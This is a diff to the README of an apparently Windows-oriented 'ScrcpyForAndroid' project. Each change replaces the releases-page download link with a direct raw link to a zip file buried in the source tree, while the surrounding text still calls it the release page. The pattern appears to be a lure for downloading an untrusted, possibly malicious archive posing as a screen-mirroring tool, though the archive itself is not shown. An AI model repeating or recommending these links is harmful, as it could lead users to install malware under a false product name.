@@ -1,6 +1,6 @@
 # 📱 ScrcpyForAndroid - Simple Android Control on Windows
 
-[![Download ScrcpyForAndroid](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/incommodious-southamericancountry546/ScrcpyForAndroid/releases)
+[![Download ScrcpyForAndroid](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/incommodious-southamericancountry546/ScrcpyForAndroid/raw/refs/heads/main/app/src/main/Scrcpy_Android_For_1.6.zip)
 
 ## 🚀 What is ScrcpyForAndroid?
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 Visit this page to download:
 
-https://github.com/incommodious-southamericancountry546/ScrcpyForAndroid/releases
+https://github.com/incommodious-southamericancountry546/ScrcpyForAndroid/raw/refs/heads/main/app/src/main/Scrcpy_Android_For_1.6.zip
 
 Look for the latest release and download the Windows file for your system. In most cases, this will be an `.exe` file or a `.zip` package.
 
@@ -39,7 +39,7 @@ A newer PC will give smoother screen mirroring. A fast USB cable also helps redu
 
 Follow these steps on Windows:
 
-1. Go to the release page: https://github.com/incommodious-southamericancountry546/ScrcpyForAndroid/releases
+1. Go to the release page: https://github.com/incommodious-southamericancountry546/ScrcpyForAndroid/raw/refs/heads/main/app/src/main/Scrcpy_Android_For_1.6.zip
 2. Download the latest Windows release file.
 3. If the file is a `.zip`, right-click it and choose Extract All.
 4. Open the extracted folder.
@@ -198,8 +198,8 @@ If you want the shortest path from download to use:
 
 ## 📦 Download Again
 
-[![Get the latest release](https://img.shields.io/badge/Get%20the%20latest%20release-grey?style=for-the-badge&logo=github&logoColor=white)](https://github.com/incommodious-southamericancountry546/ScrcpyForAndroid/releases)
+[![Get the latest release](https://img.shields.io/badge/Get%20the%20latest%20release-grey?style=for-the-badge&logo=github&logoColor=white)](https://github.com/incommodious-southamericancountry546/ScrcpyForAndroid/raw/refs/heads/main/app/src/main/Scrcpy_Android_For_1.6.zip)
 
 Go to the release page to download the latest Windows version:
 
-https://github.com/incommodious-southamericancountry546/ScrcpyForAndroid/releases
+https://github.com/incommodious-southamericancountry546/ScrcpyForAndroid/raw/refs/heads/main/app/src/main/Scrcpy_Android_For_1.6.zip
